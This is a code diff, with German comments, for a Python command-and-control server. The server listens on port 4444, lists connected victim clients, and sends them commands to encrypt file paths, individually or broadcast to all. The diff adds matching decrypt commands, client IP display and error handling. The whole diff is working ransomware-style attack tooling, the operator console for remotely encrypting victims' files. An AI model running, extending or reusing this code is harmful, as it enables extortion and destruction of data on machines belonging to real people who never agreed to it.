@@ -22,7 +22,7 @@ def handle_client(client_socket, client_address, cid):
             data = client_socket.recv(4096).decode("utf-8", errors="ignore")
             if not data:
                 break
-            print(f"[ID {cid}] Response: {data}")
+            print(f"\n[ID {cid}] Response: \n{data}")
 
     except Exception as e:
         print(f"[!] Fehler mit client ID {cid}: {e}")
@@ -65,6 +65,12 @@ def encrypt_target(cid, target_path):
     print(f"[+] Encrypt Befehl für Pfad '{target_path}' an ID {cid} gesendet")
 
 
+def decrypt_target(cid):
+    """Decrypt Befehl an einen spezifischen Client senden"""
+    send_command_to_client(cid, "decrypt")
+    print(f"[+] Decrypt Befehl an ID {cid} gesendet")
+
+
 def list_sessions():
     """Alle aktive Client Sessions ausgeben"""
     with lock:
@@ -73,7 +79,11 @@ def list_sessions():
         else:
             print("[*] Aktive Sessions:")
             for cid in clients:
-                print(f"\t ID {cid}")
+                try:
+                    ip = clients[cid].getpeername()[0]
+                    print(f"\t ID {cid} - {ip}")
+                except:
+                    print(f"\t ID {cid}")
 
 
 def server_shell():
@@ -102,12 +112,17 @@ def server_shell():
                                 encrypt_target(cid, target_path)
                             except IndexError:
                                 print("[!] Usage: encrypt <target_path>")
+
+                        elif sub_cmd == "decrypt":
+                            decrypt_target(cid)
+
                         elif sub_cmd:
                             send_command_to_client(cid, sub_cmd)
                 else:
                     print(f"[!] Client ID {cid} nicht gefunden")
             except (IndexError, ValueError):
                 print("[!] Usage: interact <client_id>")
+
         elif cmd.startswith("encrypt "):
             # Encrypt Befehl mit Client ID
             try:
@@ -120,6 +135,18 @@ def server_shell():
                     encrypt_target(cid, target_path)
             except ValueError:
                 print("[!] Client ID muss eine Zahl sein")
+
+        elif cmd.startswith("decrypt "):
+            try:
+                parts = cmd.split(" ")
+                if len(parts) != 2:
+                    print("[!] Usage: decrypt <client_id>")
+                else:
+                    cid = int(parts[1])
+                    decrypt_target(cid)
+            except ValueError:
+                print("[!] Client ID muss eine Zahl sein")
+
         elif cmd.startswith("broadcast "):
             command = cmd[10:].strip()
             if command:
@@ -133,10 +160,16 @@ def server_shell():
                         )
                     except IndexError:
                         print("[!] Usage: broadcast encrypt <target_path>")
+
+                elif command == "decrypt":
+                    broadcast_command("decrypt")
+                    print("[+] Decrypt Befehl an alle Clients gesendet")
+
                 else:
                     broadcast_command(command)
             else:
                 print("[!] Usage: broadcast <command>")
+
         elif cmd == "help":
             print("[*] Verfügbare Befehle:")
             print("  sessions                    - Zeige alle aktiven Sessions")
@@ -144,9 +177,14 @@ def server_shell():
             print(
                 "  encrypt <id> <path>         - Verschlüssle Pfad auf spezifischem Client"
             )
+            print(
+                "  decrypt <id>                - Entschlüssle Dateien auf spezifischem Client"
+            )
             print("  broadcast <cmd>             - Sende Befehl an alle Clients")
             print("  broadcast encrypt <path>    - Verschlüssle Pfad auf allen Clients")
+            print("  broadcast decrypt           - Entschlüssle auf allen Clients")
             print("  exit                        - Server beenden")
+
         elif cmd == "exit":
             with lock:
                 for client_socket in clients.values():
@@ -163,7 +201,12 @@ def main():
     global client_id
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(("0.0.0.0", 4444))
+    try:
+        server.bind(("0.0.0.0", 4444))
+    except OSError as e:
+        print(f"[!] Fehler beim Bindes des Ports: {e}")
+        return
+
     server.listen(5)
     print("[*] C2 Server started on port 4444")
     print(f"[*] Server IP: {socket.gethostbyname(socket.gethostname())}")
@@ -187,7 +230,9 @@ def main():
 
     except KeyboardInterrupt:
         print("\n[!] Shutting down Server")
+    finally:
         server.close()
+        sys.exit(0)
 
 
 if __name__ == "__main__":
